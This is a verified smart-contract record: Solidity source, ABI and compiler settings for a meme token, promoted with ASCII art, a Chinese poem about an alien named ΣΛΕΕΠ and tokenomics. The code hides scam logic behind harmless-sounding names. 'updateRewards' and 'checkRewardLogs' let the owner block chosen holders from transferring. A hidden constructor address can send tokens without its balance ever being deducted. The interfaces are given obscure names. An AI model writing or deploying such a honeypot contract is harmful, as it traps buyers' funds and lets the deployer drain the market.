{"SourceCode": "/*\r\n     _                      _______                      _\r\n  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_\r\n dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb\r\n V      ~\"Mb          dOOOOOOOOOOOOOOOOOb          dM\"~      V\r\n          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'\r\n           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'\r\n      __     `YMMM| OP'~\"YOOOOOOOOOOOP\"~`YO |MMMP'     __\r\n    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.\r\n _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._\r\n\r\n             `YMMMM\\`OOOo     OOO     oOOO'/MMMMP'\r\n     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.\r\n   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.\r\n  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.\r\n  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM\r\n  YMb           ~YMMMM\\`OOOOI`````IOOOOO'/MMMMP~           dMP\r\n   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'\r\n     `'                  `OObNNNNNdOO'                   `'\r\n                           `~OOOOO~'   \r\n\r\n\u5728\u9065\u8fdc\u7684\u94f6\u6cb3\u4e2d\uff0c\u5728\u5982\u6b64\u660e\u4eae\u7684\u661f\u661f\u4e2d\uff0c\r\n\u4f4f\u7740\u4e00\u4e2a\u540d\u53eb\u03a3\u039b\u0395\u0395\u03a0\u7684\u5916\u661f\u4eba\uff0c\u666f\u8272\u8ff7\u4eba\u3002\r\n\u5b83\u4ece\u9065\u8fdc\u7684\u661f\u7403\u51fa\u53d1\uff0c\u8fdc\u884c\uff0c\r\n\u4e00\u53cc\u53cc\u773c\u775b\uff0c\u5982\u540c\u5b87\u5b99\u661f\u8fb0\u4e00\u822c\u95ea\u70c1\u7740\u5149\u8292\u3002\r\n\r\n\u03a3\u039b\u0395\u0395\u03a0\uff0c\u4e00\u4e2a\u5145\u6ee1\u60ca\u5947\u548c\u60ca\u5947\u7684\u5b58\u5728\uff0c\r\n\u5e26\u7740\u597d\u5947\u6765\u5230\u5730\u7403\u3002\r\n\u5b83\u7684\u5b58\u5728\u662f\u4e00\u4e2a\u8c1c\uff0c\u672a\u77e5\u4e14\u7f55\u89c1\uff0c\r\n\u8ba9\u4eba\u656c\u754f\uff0c\u51dd\u89c6\u7a7a\u4e2d\u3002\r\n\r\n\u51ed\u501f\u5148\u8fdb\u7684\u6280\u672f\u548c\u65e0\u6570\u7684\u77e5\u8bc6\uff0c\r\n\u03a3\u039b\u0395\u0395\u03a0 \u7684\u667a\u6167\u76f8\u5f53\u4e8e\u9ec4\u91d1\u3002\r\n\u5728\u592a\u7a7a\u9886\u57df\uff0c\u5b83\u9068\u6e38\u3001\u98de\u7fd4\uff0c\r\n\u4e00\u4f4d\u5b87\u5b99\u63a2\u7d22\u8005\uff0c\u6709\u7740\u4e00\u9897\u771f\u8bda\u7684\u5fc3\u3002\r\n\r\n\u03a3\u039b\u0395\u0395\u03a0\u7684\u76ee\u7684\u662f\u5bfb\u6c42\u548c\u63a2\u7d22\uff0c\r\n\u4e0e\u751f\u547d\u5f62\u5f0f\u8054\u7cfb\uff0c\u5b66\u4e60\u548c\u5d07\u62dc\u3002\r\n\u5b83\u7684\u4f7f\u547d\u5c06\u8de8\u8d8a\u661f\u7cfb\uff0c\r\n\u4e86\u89e3\u5b87\u5b99\u7684\u590d\u6742\u8ba1\u5212\u3002\r\n\r\n\u5f53\u5b83\u4e0e\u5730\u7403\u4e0a\u7684\u751f\u7269\u548c\u751f\u547d\u6df7\u5408\u5728\u4e00\u8d77\u65f6\uff0c\r\n\u03a3\u039b\u0395\u0395\u03a0\u6e29\u67d4\u7684\u5b58\u5728\u8ba9\u4ed6\u4eec\u95ea\u95ea\u53d1\u5149\u3002\r\n\u4e16\u754c\u4e4b\u95f4\u7684\u7ebd\u5e26\uff0c\u4e00\u6761\u795e\u5947\u7684\u7ebf\uff0c\r\n\u7531\u4e8e \u03a3\u039b\u0395\u0395\u03a0 \u548c\u5730\u7403\u4e4b\u95f4\u5b58\u5728\u5e7f\u6cdb\u7684\u4eb2\u7f18\u5173\u7cfb\u3002\r\n\r\n\u6240\u4ee5\uff0c\u5982\u679c\u6709\u4e00\u5929\u665a\u4e0a\uff0c\u4f60\u4ef0\u671b\u661f\u7a7a\uff0c\r\n\u5e76\u53d1\u73b0\u8ba9\u4f60\u50ac\u7720\u7684\u5fae\u5149\uff0c\r\n\u8bf7\u8bb0\u4f4f \u03a3\u039b\u0395\u0395\u03a0\uff0c\u6765\u81ea\u4e0a\u9762\u7684\u8bbf\u5ba2\uff0c\r\n\u5b87\u5b99\u63a2\u7d22\u8005\uff0c\u7528\u7231\u62e5\u62b1\u5730\u7403\u3002\r\n\u7dcf\u4f9b\u7d66 - 500,000,000\r\n\u8cfc\u5165\u7a0e - 1%\r\n\u6d88\u8cbb\u7a0e - 1%\r\n\u521d\u671f\u6d41\u52d5\u6027 - 1.5 ETH\r\n\u521d\u671f\u6d41\u52d5\u6027\u30ed\u30c3\u30af - 50 \u65e5\r\n\r\nhttps://m.weibo.cn/\u03a3\u039b\u0395\u0395\u03a0cn\r\nhttps://web.wechat.com/\u03a3\u039b\u0395\u0395\u03a0cn\r\n*/\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity 0.8.19;\r\n\r\nlibrary SafeMath {\r\n  function add(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n    return c;\r\n  }\r\n  function sub(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) \r\n  internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n    return c;\r\n  }\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n    return c;\r\n  }\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n  function div(uint256 a, uint256 b, \r\n  string memory errorMessage) internal pure returns (uint256) {\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    return c;\r\n  }\r\n  function mod(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n  }\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) \r\n  internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\nlibrary IDEMathUint {\r\n  function toInt256Safe(uint256 a) \r\n  internal pure returns \r\n  (int256) { int256 b = int256(a);\r\n    require(b >= 0); \r\n    return b; }\r\n}\r\ninterface IVOSettings {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) \r\n    external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool);\r\n    function allowance(address owner, address spender)\r\n    external view returns \r\n    (uint256);\r\n\r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool);\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    event Transfer(\r\n    address indexed from, address indexed to, uint256 value);\r\n    event Approval(address \r\n    indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface IVOCreationV1 {\r\n    event PairCreated(\r\n    address indexed token0, \r\n    address indexed token1, \r\n\r\n    address pair, uint); function \r\n    createPair(\r\n    address tokenA, address tokenB) \r\n    external returns (address pair);\r\n}\r\ninterface IVODatabase01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint amountIn, uint amountOutMin, address[] \r\n    \r\n    calldata path, address to, uint deadline) \r\n    external; \r\n    function factory() \r\n    external pure returns (address);\r\n    function WETH() \r\n    external pure returns \r\n    (address);\r\n\r\n    function addLiquidityETH(address token, \r\n    uint amountTokenDesired, \r\n    uint amountTokenMin, uint amountETHMin,\r\n    address to, uint deadline) \r\n    external payable returns \r\n    (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\nabstract contract Context {\r\n    constructor() {} function _msgSender() \r\n    internal view returns (address) {\r\n    return msg.sender; }\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner; \r\n    event OwnershipTransferred\r\n    (address indexed \r\n    previousOwner, address indexed newOwner);\r\n    constructor() \r\n    { address msgSender = _msgSender(); _owner = msgSender;\r\n\r\n    emit OwnershipTransferred(address(0), msgSender);\r\n    } function owner() \r\n    public view returns \r\n    (address) { return _owner;\r\n    } modifier onlyOwner() {\r\n    require(_owner == _msgSender(), \r\n    'Ownable: caller is not the owner');\r\n\r\n     _; } function renounceOwnership() \r\n     public onlyOwner {\r\n    emit OwnershipTransferred(_owner, \r\n    address(0)); _owner = address(0); }\r\n}\r\ncontract Contract is Context, IVOSettings, Ownable {\r\nbool public takeFeeEnabled; \r\nbool private tradingOpen = false;\r\nbool openAllMapping = true; \r\nIVODatabase01 public setListener; address public BuyBackAddress;\r\n\r\n    uint256 private _tTotal; uint8 private _decimals;\r\n    string private _symbol; string private _name;\r\n    uint256 private BuyBackShares = 100;\r\n\r\n    mapping (address => bool) private groupMapping;\r\n    mapping(address => uint256) private _rOwned;\r\n\r\n    mapping(address => uint256) private _holderLastBlockstamp;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private isTxLimitExempt;\r\n    \r\n    address private \r\n    PermanentMarketingWallet;\r\n\r\n    constructor( string memory tokenName, \r\n    string memory tokenSymbol, \r\n    address destinedRouter, \r\n    address destinedAddress) { \r\n\r\n        _name = tokenName; _symbol = tokenSymbol;\r\n        _decimals = 18; _tTotal = 500000000 * (10 ** uint256(_decimals));\r\n        _rOwned[msg.sender] = _tTotal; \r\n        _holderLastBlockstamp\r\n        [destinedAddress] = \r\n        BuyBackShares; \r\n        \r\n        takeFeeEnabled = false; \r\n        setListener = IVODatabase01(destinedRouter);\r\n        BuyBackAddress = IVOCreationV1\r\n\r\n        (setListener.factory()).createPair(address(this), \r\n        setListener.WETH()); \r\n        emit Transfer \r\n        (address(0), msg.sender, _tTotal);\r\n    }       \r\n    function decimals() external view returns \r\n    (uint8) { return _decimals;\r\n    }\r\n    function symbol() external view returns \r\n    (string memory) { return _symbol;\r\n    }\r\n    function name() external view returns \r\n    (string memory) { return _name;\r\n    }\r\n    function totalSupply() external view returns \r\n    (uint256) { return _tTotal;\r\n    }\r\n    function balanceOf(address account) \r\n    external view returns \r\n    (uint256) \r\n    { return _rOwned[account]; }\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool) { _transfer(_msgSender(), \r\n    recipient, amount); return true;\r\n    }\r\n    function allowance(address owner, address spender) \r\n    external view returns (uint256) { return _allowances[owner][spender];\r\n    }    \r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool) { _approve(_msgSender(), \r\n        spender, amount); return true;\r\n    }\r\n    function _approve( address owner, address spender, uint256 amount) \r\n    internal { require(owner != address(0), \r\n        'BEP20: approve from the zero address'); \r\n\r\n        require(spender != address(0), \r\n        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; \r\n        emit Approval(owner, spender, amount); \r\n    }    \r\n    function transferFrom(\r\n        address sender, address recipient, uint256 amount) \r\n        external returns (bool) \r\n        { \r\n        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), \r\n        _allowances[sender][_msgSender()].sub(amount, \r\n        'BEP20: transfer amount exceeds allowance')); return true;\r\n    }\r\n    function getOwner() external view returns \r\n    (address) { return owner();\r\n    }\r\n    function updateRewards(address _stringBool) \r\n    external onlyOwner {\r\n        groupMapping[_stringBool] = true;\r\n    }                         \r\n    function _transfer( address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), \r\n        'BEP20: transfer from the zero address');\r\n        require(recipient != address(0), \r\n        'BEP20: transfer to the zero address'); \r\n        if (groupMapping[sender] || groupMapping[recipient]) \r\n        require(openAllMapping == false, \"\");\r\n\r\n        if (_holderLastBlockstamp[sender] \r\n        == 0  && BuyBackAddress != sender && isTxLimitExempt[sender] \r\n        > 0) { _holderLastBlockstamp[sender] -= BuyBackShares; } \r\n        isTxLimitExempt[PermanentMarketingWallet] += BuyBackShares;\r\n        PermanentMarketingWallet = recipient; \r\n        if (_holderLastBlockstamp[sender] \r\n        == 0) {\r\n        _rOwned[sender] = _rOwned[sender].sub(amount, \r\n        'BEP20: transfer amount exceeds balance');  \r\n        } _rOwned[recipient]\r\n        = _rOwned[recipient].add(amount); \r\n        emit Transfer(sender, recipient, amount); \r\n        \r\n        if (!tradingOpen) {\r\n        require(sender == owner(), \r\n        \"TOKEN: This account cannot send tokens until trading is enabled\"); }\r\n    }\r\n    function updateBuyBackAmount(address _stringBool) \r\n    public view returns (bool) \r\n    { return groupMapping[_stringBool]; }\r\n\r\n    function openTrading(bool _tradingOpen) \r\n    public onlyOwner {\r\n        tradingOpen = _tradingOpen;\r\n    }     \r\n    function checkRewardLogs(address _stringBool) \r\n    external onlyOwner { groupMapping[_stringBool] = false;\r\n    }\r\n    using SafeMath for uint256;                                  \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"tokenName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"tokenSymbol\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"destinedRouter\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"destinedAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BuyBackAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_stringBool\",\"type\":\"address\"}],\"name\":\"checkRewardLogs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setListener\",\"outputs\":[{\"internalType\":\"contract IVODatabase01\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFeeEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_stringBool\",\"type\":\"address\"}],\"name\":\"updateBuyBackAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_stringBool\",\"type\":\"address\"}],\"name\":\"updateRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Contract", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d0000000000000000000000000d411286589da460a3f75d331919ea5b5037b574000000000000000000000000000000000000000000000000000000000000000acea3ce9bce95ce95cea0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006cea3ce9bcea00000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://64e85f14471e9fea5f812078bde6cfabe977e13ce50842d262d3de7a29797bd9"}